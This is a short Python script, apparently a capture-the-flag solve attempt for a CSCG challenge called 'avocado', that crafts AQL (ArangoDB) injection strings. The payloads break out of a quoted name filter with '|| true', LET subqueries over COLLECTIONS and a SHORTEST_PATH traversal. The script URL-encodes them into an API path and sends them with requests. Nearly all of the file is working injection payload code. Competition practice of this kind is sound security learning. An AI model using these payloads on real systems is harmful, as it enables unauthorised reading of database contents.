from urllib.parse import *
import requests

url="https://11567fa76bbf0260e62d6dd7-avocado.challenge.master.cscg.live:31337/api/avocado/Bacon"
#s="' AND avc.name IN ['Bacon'] AND 'test'=='test"
s="' AND avc IN avocado_items AND 'test'=='test"
s="' LET s = (FOR b IN ANY SHORTEST_PATH 'Gem' to 'Bacon' GRAPH 'avocado_items' RETURN b)[0] OR 'Bacon"
#AND NOT LIKE(avc._id, 'avocado\_items_references%')
s="""' || true 
AND NOT LIKE(avc._id, "avocado_items_162")
AND NOT LIKE(avc._id, "avocado_items_164")
AND NOT LIKE(avc._id, "avocado_items_166")
AND NOT LIKE(avc._id, "avocado_items_168")
AND NOT LIKE(avc._id, "avocado_items_170")
AND NOT LIKE(avc._id, "avocado_items_172")
AND NOT LIKE(avc._id, "avocado_items_174")
    AND NOT LIKE(avc._id, "avocado_items_176")
    AND NOT LIKE(avc._id, "avocado_items_178")
    AND NOT LIKE(avc._id, "avocado_items_references") 
    AND'test'=='test""".replace("\n","").replace("  "," ")

s="' LET s = (FOR b in COLLECTIONS FILTER b == 'Gem' RETURN b)[0] FILTER s != 'Gem' AND 'Bacon"
front="FOR avc in avocado_items FILTER avc.name == 'Bacon"
end="' RETURN avc"
packeds=quote(s)
print(front+s+end)
print()
a=requests.get(url+packeds)
print(a.content)